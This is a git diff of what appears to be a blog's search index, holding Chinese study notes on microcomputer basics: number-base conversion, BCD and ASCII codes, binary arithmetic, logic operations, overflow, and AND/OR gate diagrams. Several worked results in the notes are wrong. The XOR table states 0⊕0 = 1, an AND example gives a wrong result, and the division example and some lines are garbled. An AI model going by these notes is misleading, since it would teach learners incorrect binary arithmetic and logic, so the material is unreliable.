+    <content><![CDATA[<h1 id="计算机中的编码，数制及转换"><a href="#计算机中的编码，数制及转换" class="headerlink" title="计算机中的编码，数制及转换"></a>计算机中的编码，数制及转换</h1><h2 id="常用进制"><a href="#常用进制" class="headerlink" title="常用进制"></a>常用进制</h2><p>二进制、八进制、十进制、十六进制</p>
+<h3 id="十进制"><a href="#十进制" class="headerlink" title="十进制"></a>十进制</h3><p>数码：0；1；2；3；4；5；6；7；8；9</p>
+<p>进位规则：逢十进一</p>
+<p>表示字母：D（可省略）</p>
+<p>示例：101D；123</p>
+<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p>数码：0；1</p>
+<p>进位规则：逢二进一</p>
+<p>表示字母：B</p>
+<p>示例：101；10B</p>
+<h3 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h3><p>数码：0；1；2；3；4；5；6；7</p>
+<p>进位规则：逢八进一</p>
+<p>表示字母：O</p>
+<p>示例：101；456O</p>
+<h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p>数码：0；1；2；3；4；5；6；7；8；9；A;B;C;D;E;F（不区分大小写）</p>
+<p>进位规则：逢十六进一</p>
+<p>表示字母：H</p>
+<p>示例：10119H；0A123H（首位是字母，则开头为零）</p>
+<h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><h3 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h3><p>整数部分转换：除以二取余数部分，倒序</p>
+<p>小数部分转换：乘以二取整数部分正序</p>
+<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
+<p>例：10.25D&#x3D;1010.01B；12.8125D&#x3D;1100.1101B</p>
+<h3 id="十进制转八进制"><a href="#十进制转八进制" class="headerlink" title="十进制转八进制"></a>十进制转八进制</h3><p>整数部分转换：除以八取余数部分，倒序</p>
+<p>小数部分转换：乘以八取整数部分正序</p>
+<p>例：126.64D&#x3D;176.507O</p>
+<h3 id="十进制转十六进制"><a href="#十进制转十六进制" class="headerlink" title="十进制转十六进制"></a>十进制转十六进制</h3><p>整数部分转换：除以十六取余数部分，倒序</p>
+<p>小数部分转换：乘以十六取整数部分正序</p>
+<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
+<p>例：126.64D&#x3D;7E.A3H</p>
+<h3 id="二进制转十进制"><a href="#二进制转十进制" class="headerlink" title="二进制转十进制"></a>二进制转十进制</h3><ul>
+<li>计算按权位展开求和</li>
 </ul>
-<br>
-
-<p>指令执行过程：取指令→分析指令→读取操作数→执行指令→存放结果</p>
-<blockquote>
-<p>顺序执行：一条指令执行完了在执行吓一条指令</p>
-<p>并行执行：同时执行两条或多条指令</p>
-</blockquote>
+<ul>
+<li><p>整数部分：从右到左，从二的零次方开始指数逐次加一</p>
+</li>
+<li><p>小数部分：从左到右，从二的-1次方开始指数逐次减一</p>
+</li>
+</ul>
+<p>例： 10.101 B &#x3D; 2.625 D     </p>
+<p>整数部分：1 * 2<sup>1</sup> +0 * 2<sup>0</sup>  &#x3D; 2       小数部分： 1 * 2<sup>-1</sup> + 0 * 2<sup>-1</sup> + 1 * 2 <sup>-2</sup>  &#x3D; 0.5 + 0.125 &#x3D; 0.625 </p>
+<h3 id="八进制转十进制"><a href="#八进制转十进制" class="headerlink" title="八进制转十进制"></a>八进制转十进制</h3><ul>
+<li><p>计算按权位展开求和</p>
+</li>
+<li><p>整数部分：从右到左，从八的零次方开始指数逐次加一</p>
+</li>
+<li><p>小数部分：从左到右，从八的-1次方开始指数逐次减一</p>
+</li>
+</ul>
+<h3 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h3><ul>
+<li><p>计算按权位展开求和</p>
+</li>
+<li><p>整数部分：从右到左，从十六的零次方开始指数逐次加一</p>
+</li>
+<li><p>小数部分：从左到右，从十六的-1次方开始指数逐次减一</p>
+</li>
+</ul>
+<p>例： 12CCB.12   &#x3D; 77003.0703125</p>
+<p>整数部分12CCB &#x3D; 1 * 16<sup>4</sup> + 2 * 16 <sup>3</sup> + 12 * 16<sup>2</sup> + 12 * 16<sup>1</sup> +11 * 16 <sup>0</sup>  &#x3D; 77003</p>
+<p>小数部分0.12 &#x3D; 1 * 16<sup>-1</sup> + 2 * 16<sup>-2</sup> &#x3D; 0.0625 + 0&#x2F;0078125 &#x3D; 0 .0703125</p>
+<h3 id="二进制转八进制"><a href="#二进制转八进制" class="headerlink" title="二进制转八进制"></a>二进制转八进制</h3><ul>
+<li><p>整数部分：从右到左，每三位为一个八进制数，不够三位前面补零</p>
+</li>
+<li><p>小数部分：从左到右，每三位为一个八进制数，不够三位后面补零</p>
+</li>
+<li><p>无论是整数还是小数，每组按整权位展开求和计算</p>
+</li>
+</ul>
+<p>例： 1101.10   &#x3D; 15.4</p>
+<p>整数部分： 001        101  &#x3D;   1     5       小数部分： 100  &#x3D;  4</p>
+<h3 id="二进制转十六进制"><a href="#二进制转十六进制" class="headerlink" title="二进制转十六进制"></a>二进制转十六进制</h3><ul>
+<li><p>整数部分：从右到左，每四位为一个十六进制数，不够三位前面补零</p>
+</li>
+<li><p>小数部分：从左到右，每四位为一个十六进制数，不够三位后面补零</p>
+</li>
+<li><p>无论是整数还是小数，每组按整权位展开求和计算</p>
+</li>
+</ul>
+<p>例： 10101.10   &#x3D; 15.8 </p>
+<p>整数部分： 0001        0101  &#x3D;   1     5       小数部分： 1000  &#x3D;  8 </p>
+<h3 id="十六进制转二进制"><a href="#十六进制转二进制" class="headerlink" title="十六进制转二进制"></a>十六进制转二进制</h3><ul>
+<li>0A9.67  H &#x3D; 1010  1001.0110  0111  B </li>
+<li>每位数字用四位二进制数表示</li>
+</ul>
+<p>整数： A &#x3D;1010  9&#x3D; 1001          小数： 6 &#x3D; 0110    7 0111  </p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -8369,7 +8354,7 @@ graph TD;
       </tags>
   </entry>
   <entry>
-    <title>微机原理四</title>
+    <title>微机原理基础三</title>
     <url>/posts/68f4f1d9/</url>
     <content><![CDATA[<h1 id="机器数的表示及运算"><a href="#机器数的表示及运算" class="headerlink" title="机器数的表示及运算"></a>机器数的表示及运算</h1><h2 id="机器数为符号数值变化的数"><a href="#机器数为符号数值变化的数" class="headerlink" title="机器数为符号数值变化的数"></a>机器数为符号数值变化的数</h2><p>0 表示 “+”  ；  1 表示“-”</p>
 <ul>
@@ -8510,90 +8495,342 @@ graph TD;
   </entry>
   <entry>
     <title>微机原理基础二</title>
-    <url>/posts/ac776871/</url>
-    <content><![CDATA[<h1 id="计算机中的编码，数制及转换"><a href="#计算机中的编码，数制及转换" class="headerlink" title="计算机中的编码，数制及转换"></a>计算机中的编码，数制及转换</h1><h2 id="常用进制"><a href="#常用进制" class="headerlink" title="常用进制"></a>常用进制</h2><p>二进制、八进制、十进制、十六进制</p>
-<h3 id="十进制"><a href="#十进制" class="headerlink" title="十进制"></a>十进制</h3><p>数码：0；1；2；3；4；5；6；7；8；9</p>
-<p>进位规则：逢十进一</p>
-<p>表示字母：D（可省略）</p>
-<p>示例：101D；123</p>
-<h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p>数码：0；1</p>
-<p>进位规则：逢二进一</p>
-<p>表示字母：B</p>
-<p>示例：101；10B</p>
-<h3 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h3><p>数码：0；1；2；3；4；5；6；7</p>
-<p>进位规则：逢八进一</p>
-<p>表示字母：O</p>
-<p>示例：101；456O</p>
-<h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p>数码：0；1；2；3；4；5；6；7；8；9；A;B;C;D;E;F（不区分大小写）</p>
-<p>进位规则：逢十六进一</p>
-<p>表示字母：H</p>
-<p>示例：10119H；0A123H（首位是字母，则开头为零）</p>
-<h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><h3 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h3><p>整数部分转换：除以二取余数部分，倒序</p>
-<p>小数部分转换：乘以二取整数部分正序</p>
-<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
-<p>例：10.25D&#x3D;1010.01B；12.8125D&#x3D;1100.1101B</p>
-<h3 id="十进制转八进制"><a href="#十进制转八进制" class="headerlink" title="十进制转八进制"></a>十进制转八进制</h3><p>整数部分转换：除以八取余数部分，倒序</p>
-<p>小数部分转换：乘以八取整数部分正序</p>
-<p>例：126.64D&#x3D;176.507O</p>
-<h3 id="十进制转十六进制"><a href="#十进制转十六进制" class="headerlink" title="十进制转十六进制"></a>十进制转十六进制</h3><p>整数部分转换：除以十六取余数部分，倒序</p>
-<p>小数部分转换：乘以十六取整数部分正序</p>
-<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
-<p>例：126.64D&#x3D;7E.A3H</p>
-<h3 id="二进制转十进制"><a href="#二进制转十进制" class="headerlink" title="二进制转十进制"></a>二进制转十进制</h3><ul>
-<li>计算按权位展开求和</li>
+    <url>/posts/24269dc7/</url>
+    <content><![CDATA[<h1 id="微机原理四"><a href="#微机原理四" class="headerlink" title="微机原理四"></a>微机原理四</h1><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><ul>
+<li>ascll码（七位二进制数表示）</li>
 </ul>
+<p>常用： “0”——48 ； “A” —— 65  ； “a”—— 97 </p>
 <ul>
-<li><p>整数部分：从右到左，从二的零次方开始指数逐次加一</p>
-</li>
-<li><p>小数部分：从左到右，从二的-1次方开始指数逐次减一</p>
-</li>
-</ul>
-<p>例： 10.101 B &#x3D; 2.625 D     </p>
-<p>整数部分：1 * 2<sup>1</sup> +0 * 2<sup>0</sup>  &#x3D; 2       小数部分： 1 * 2<sup>-1</sup> + 0 * 2<sup>-1</sup> + 1 * 2 <sup>-2</sup>  &#x3D; 0.5 + 0.125 &#x3D; 0.625 </p>
-<h3 id="八进制转十进制"><a href="#八进制转十进制" class="headerlink" title="八进制转十进制"></a>八进制转十进制</h3><ul>
-<li><p>计算按权位展开求和</p>
-</li>
-<li><p>整数部分：从右到左，从八的零次方开始指数逐次加一</p>
-</li>
-<li><p>小数部分：从左到右，从八的-1次方开始指数逐次减一</p>
+<li><p>数值编码：BCD码（8421）用四位二进制数码表示一位十进制数</p>
+<p>0 	 0	  0	  0              (0000)<sub>BCD</sub> &#x3D; (0)<sub>10</sub>        ;      (0100)<sub>BCD</sub> &#x3D; (4)<sub>10</sub>    ;    (01100100)<sub>BCD</sub> &#x3D; (64)<sub>10</sub>  </p>
+<p>2<sup>3</sup>	2<sup>2</sup>	2<sup>1</sup>	2<sup>0</sup></p>
 </li>
 </ul>
-<h3 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h3><ul>
-<li><p>计算按权位展开求和</p>
+<p>注：用0000~1001分别代表他所对应的十进制数，余下的（1010-1111）六组代码不用，一般跟十进制转换。</p>
+<h2 id="无符号二进制的算术运算和逻辑运算"><a href="#无符号二进制的算术运算和逻辑运算" class="headerlink" title="无符号二进制的算术运算和逻辑运算"></a>无符号二进制的算术运算和逻辑运算</h2><ul>
+<li>算术运算：加法、减法、乘法、除法</li>
+<li>逻辑运算： 与运算、或运算、非运算、异或运算</li>
+</ul>
+<h3 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h3><h4 id="加法："><a href="#加法：" class="headerlink" title="加法："></a>加法：</h4><p>0 + 1 &#x3D; 1		 ；    1 + 1 &#x3D; 10 ； 		 101B + 10B &#x3D; 1011B</p>
+<h4 id="减法"><a href="#减法" class="headerlink" title="减法"></a>减法</h4><p>1 - 1 &#x3D; 0   ；  1 -0 &#x3D; 1   ；  10 - 1 &#x3D; 1 ；   110B - 11B  &#x3D; 11B</p>
+<h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>0011 1010 B *  0100 B &#x3D; 0011 1010 00 B</p>
+<ul>
+<li>将其中一个乘数转为2<sup>n</sup> </li>
+<li>如果n为整数且大于零“左移n位，右边补零”</li>
+<li>如果不是整数且大于零“转为十进制数再乘，再转为二进制数”</li>
+</ul>
+<h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p>0011 1010 B ÷ 1 0011 1011 B &#x3D; 1 1000 0110 B</p>
+<ul>
+<li>将被除数转为2<sup>n</sup> </li>
+<li>如果n为整数且大于零“右移n位，右边补零”</li>
+<li>如果不是整数且大于零“转为十进制数再乘，再转为二进制数</li>
+</ul>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p> 100 1011 B + 1 0011 1011 B &#x3D; 1 1000 0110 B</p>
+<p>11 1001 B - 1 0111 B &#x3D; 10 0010 B<br>1 0011 B × 0100 B &#x3D; 100 1100 B<br>1 0011 B ÷ 0100 B &#x3D; 100B 	余数： 11B</p>
+<p>总结： 其他进制的运算参数对应其进制数 ：方法不变</p>
+<h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><h4 id="”与“运算-符号-：∧（并且）"><a href="#”与“运算-符号-：∧（并且）" class="headerlink" title="”与“运算  符号 ：∧（并且）"></a>”与“运算  符号 ：∧（并且）</h4><p>1 ∧ 1 &#x3D; 1  ； 1 ∧ 0 &#x3D; 0 ； 0 ∧1 &#x3D; 0 ； 0 ∧ 0 &#x3D; 0 </p>
+<p>计算要点： 1为真、零为假； 同时真为真</p>
+<p>例： 110 0110 B ∧ 1011 1010 B &#x3D; 1000 1000 B</p>
+<h4 id="”或“运算-符号：-∨（或者）"><a href="#”或“运算-符号：-∨（或者）" class="headerlink" title="”或“运算 符号： ∨（或者）"></a>”或“运算 符号： ∨（或者）</h4><p>1∨1 &#x3D; 1  ； 1 ∨ 0 &#x3D; 1 ； 0 ∨1 &#x3D; 1 ； 0 ∨ 0 &#x3D; 0 </p>
+<p>计算要点： 1为真、零为假； 同时假为假</p>
+<p>例： 1100 1101 B ∨ 1011 1010 B &#x3D; 1111 1111 B</p>
+<h4 id="”非“运算-符号-￣"><a href="#”非“运算-符号-￣" class="headerlink" title="”非“运算 符号 ￣"></a>”非“运算 符号 ￣</h4><p><span style="text-decoration: overline">1B</span> &#x3D; <span style="text-decoration: overline">0B</span>    ;  <span style="text-decoration: overline">0B</span> &#x3D; <span style="text-decoration: overline">1B</span>   </p>
+<p>计算要点： 按位取反</p>
+<p>例： <span style="text-decoration: overline">101 0011 B</span> &#x3D; <span style="text-decoration: overline">010 1100</span></p>
+<h4 id="”异或“运算-符号⊕"><a href="#”异或“运算-符号⊕" class="headerlink" title="”异或“运算  符号⊕"></a>”异或“运算  符号⊕</h4><p> 1 ⊕ 1 &#x3D; 0  ； 0 ⊕ 1 &#x3D; 1  ； 1 ⊕ 0 &#x3D; 1   ；0 ⊕ 0 &#x3D; 1</p>
+<p>计算要点： 两位相同结果为零 ，两位相异结果为一</p>
+<p>例： 1100 1101 B ⊕ 1011 1010 B &#x3D; 0111 0111 B</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>微机原理</category>
+      </categories>
+      <tags>
+        <tag>微机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微机原理基础四</title>
+    <url>/posts/bf1bf027/</url>
+    <content><![CDATA[<h2 id="运算中的溢出"><a href="#运算中的溢出" class="headerlink" title="运算中的溢出"></a>运算中的溢出</h2><p>运算结果超出范围则溢出</p>
+<p>判断溢出：</p>
+<ul>
+<li><p>无符号数：最高位向更高位进位或借位</p>
+<p>例： 1111 1111 B + 0000 0001 B   </p>
 </li>
-<li><p>整数部分：从右到左，从十六的零次方开始指数逐次加一</p>
+<li><p>有符号数：两数相加得负数（上溢），两数相减得正数（下溢）</p>
+<p>例： </p>
+<ul>
+<li><p>0111 1111 B + 0000 0001 &#x3D; <u>1</u>000 0000 （上溢）</p>
 </li>
-<li><p>小数部分：从左到右，从十六的-1次方开始指数逐次减一</p>
+<li><p>[+72] + [+98]  ； [72]<sub>补</sub> &#x3D; 0100 1000 B      ； [98]<sub>补</sub> &#x3D; 0110 0010 B</p>
+<p>[72]<sub>补</sub> +  [98]<sub>补</sub>  &#x3D; 10101010  （上溢）</p>
 </li>
 </ul>
-<p>例： 12CCB.12   &#x3D; 77003.0703125</p>
-<p>整数部分12CCB &#x3D; 1 * 16<sup>4</sup> + 2 * 16 <sup>3</sup> + 12 * 16<sup>2</sup> + 12 * 16<sup>1</sup> +11 * 16 <sup>0</sup>  &#x3D; 77003</p>
-<p>小数部分0.12 &#x3D; 1 * 16<sup>-1</sup> + 2 * 16<sup>-2</sup> &#x3D; 0.0625 + 0&#x2F;0078125 &#x3D; 0 .0703125</p>
-<h3 id="二进制转八进制"><a href="#二进制转八进制" class="headerlink" title="二进制转八进制"></a>二进制转八进制</h3><ul>
-<li><p>整数部分：从右到左，每三位为一个八进制数，不够三位前面补零</p>
-</li>
-<li><p>小数部分：从左到右，每三位为一个八进制数，不够三位后面补零</p>
-</li>
-<li><p>无论是整数还是小数，每组按整权位展开求和计算</p>
 </li>
 </ul>
-<p>例： 1101.10   &#x3D; 15.4</p>
-<p>整数部分： 001        101  &#x3D;   1     5       小数部分： 100  &#x3D;  4</p>
-<h3 id="二进制转十六进制"><a href="#二进制转十六进制" class="headerlink" title="二进制转十六进制"></a>二进制转十六进制</h3><ul>
-<li><p>整数部分：从右到左，每四位为一个十六进制数，不够三位前面补零</p>
-</li>
-<li><p>小数部分：从左到右，每四位为一个十六进制数，不够三位后面补零</p>
-</li>
-<li><p>无论是整数还是小数，每组按整权位展开求和计算</p>
-</li>
+<h2 id="基本逻辑门及常用逻辑部件"><a href="#基本逻辑门及常用逻辑部件" class="headerlink" title="基本逻辑门及常用逻辑部件"></a>基本逻辑门及常用逻辑部件</h2><h3 id="与运算"><a href="#与运算" class="headerlink" title="与运算"></a>与运算</h3><p>与运算：全真则真，有假则假</p>
+<p>符号：“•”、“&amp;”  、 “∧”、“×”</p>
+<p>1表示真 0表示假</p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="198px" height="61px" viewBox="-0.5 -0.5 198 61" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T10:40:10.656Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; version=&quot;13.3.6&quot; etag=&quot;HYienJKTCWm6M9oDBbRL&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;DT1YaVTFAreABfGrM5DE&quot;&gt;5VdNj5swEP01HFuBCSQ55mPbXiqtlEO7RzeeBUuAqWMS0l/fMTYQPrJCCq1WrRIFz7M9tufNvBjH36XlZ0nz+KtgkDjEZaXj7x1CFoQ4+uuyqwGIvzJAJDkzkNcCB/4LLOhatOAMTp2BSohE8bwLHkWWwVF1MCqluHSHvYqku2pOIxgAhyNNhug3zlRs0BVZtvgX4FFcr+yFa9OT0nqwPckppkxcbiD/yfF3UghlWmm5g0THro6LmffpTm+zMQmZmjLBEnGmSWHP5pAwwanbV4EecIPqak8d/ixE3fHhVHGywQG4Wtl2YivSz03tBpc2ngxuT904JQpKjccqTRDwsEkTHmXYPuIRQCJwBqk4Bn9jO1LOmJ6+lYDboD8qVy7aueCZqqgNtk6w174KJcxWK9f2sOgPyrsB8xoaMH1BpKDkFYfYCWubqTZzV5bHS5sGvoXimwyo6aY28aLGb8sNNiw941T5f4iq7X9Clef+Pa4WI1z1ogkZ22gpQisTGXQDCyVX33WoPq7d2n6p7GCxtPa+tLGsjOuN8QyS45Y1IxVm1gbWE7WTKOQROsk1Ibg30QtGoldjEhKq+Lm74lhI7QrPOiFa7khNVk1enxWzeTvrVuB6jryg58jr7UVRGYEaOKoYbo49ifTgQdLv0PRuOPHqLLGhXM9ESd/PfIyED0vmoieZeKVIhOzMcIjvUf0ZSis+aZprcat+pwqtFEXGgNnqvcRcwSGnVale8D41ljUPCWWfkOVQKJcjaRXOIJTLmYSyJ5JvSuQEOQzfWemRxdslM7X0Gh77/4nz197q4dobv668/KvXFRIGoxzPf11Bs33DMNS2r2n+028=&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><rect x="0" y="10" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 15px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">A</font></div></div></div></foreignObject><text x="15" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="0" y="30" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 40px; margin-left: 15px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">B</font></div></div></div></foreignObject><text x="15" y="44" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><path d="M 27.03 40.94 L 52 41" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 25 20 L 52 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><rect x="52" y="0" width="70" height="60" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 68px; height: 1px; padding-top: 30px; margin-left: 53px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; "><font style="font-size: 40px" color="#1a1a1a">&amp;</font></div></div></div></foreignObject><text x="87" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">&amp;</text></switch></g><path d="M 122 30 L 172 30" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><rect x="167" y="20" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 30px; margin-left: 182px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">Y</font></div></div></div></foreignObject><text x="182" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Y</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" >A•B=Y</td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+        <td align="center">C</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">1</td>
+        <td align="center">1</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+        <td align="center">0</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">0</td>
+        <td align="center">0</td>
+    </tr>
+
+
+<h3 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h3><p>或运算：有真则真，全假则假</p>
+<p>符号：“ + ” 、 “ ∨ ”、“ | ”</p>
+<p>1表示真 0表示假</p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="198px" height="61px" viewBox="-0.5 -0.5 198 61" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T09:13:19.416Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; etag=&quot;iTYSkv1JopXEJPYL9Ihx&quot; version=&quot;13.3.6&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;YpUm-cuoPqLpdjfPtrp1&quot; name=&quot;第 1 页&quot;&gt;5Vddb9owFP01eeyUOF/wyFfXTZpUqQ9b9+bFl8SaEwdjIOzXz4kdQj5aWAtD2gQS9rF9fH3P9SGx3FlafBQ4T75wAsxCNiksd24h5CFklV+b7DWA3JEGYkGJhpwGeKK/wIC2QTeUwLo1UXLOJM3bYMSzDCLZwrAQfNeetuSsvWuOY+gBTxFmffQrJTLR6AiFDf4ANE7qnZ1grEdSXE82J1knmPDdEeQuLHcmOJe6lRYzYGXu6rzodfcvjB4CE5DJcxZw+n0q9uznMl59Lu5XxSePPdwZli1mG3NgCwVM8U2XXNGqqOXepCJYbXg9cLeuhJqoCSqEohlUrbj8ndQ0Kh7NpHGTigMpklCUeCJTpgBHNTGjcabakToXCAVsQUiqFJmYgZQSUi6fClBh4B8Vla36OaeZrPT2p5Y/L7k2kutQK2pzWMUHxYtZdA7aqJoGnoIUezXFLBib8jXlPDLi7pracA2UHJVFXQPYVGN84G0EUw2j2R/oh66k3/Q/0c+xbyygNyBgJ8WQkUnpZKqX8Qza2YaCym9l/j6M7br/XPV9LzT9eWESXHX2R51HEFSdo5SpwvTeQHqe2Emvio9vRASnKrMvw1Ge/YE815gAhiXdtsMYSr7Z4bEsnUZlVMtay9zVT4dvVh2bZofI8TtETicWiUUMskdU1cLh2G8vD/+d5XGuoLcSykFuK7/jC+nU5bmyTMEpG44446JlwxZyHVx++uZbr13nODvHwr1BC7cWyBqNrUnoHHm5pmxvc8riBd9kBIixiF1CJTzluLr8O/XMN1Rw77LorpZh36LDgYoMrmXR4YUsumPPr5rzBY04uKkRe6/fy3Pv90Hx7v/2X7rgo1MX/I3PWc//6nMWCvxB4S//nKW6zUuU1rt5E3UXvwE=&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><rect x="0" y="10" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 15px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">A</font></div></div></div></foreignObject><text x="15" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="0" y="30" width="30" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 40px; margin-left: 15px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; "><font style="font-size: 20px">B</font></div></div></div></foreignObject><text x="15" y="44" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><path d="M 27.03 40.94 L 52 41" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 25 20 L 52 20" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><rect 